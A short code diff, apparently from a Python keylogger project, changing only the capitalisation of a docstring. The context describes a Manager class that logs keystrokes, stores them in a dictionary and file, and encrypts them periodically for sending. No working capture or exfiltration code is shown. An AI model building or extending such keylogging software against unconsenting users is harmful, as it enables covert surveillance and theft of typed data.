@@ -14,7 +14,7 @@ class Manager:
         self.l.start_logging()
 
     def activity(self):
-        """Perform the keylogging activity,
+        """Perform the KeyLogging activity,
         writing data to a dictionary and file, and encrypting it periodically."""
         minute = 60
         send_encryption = 5
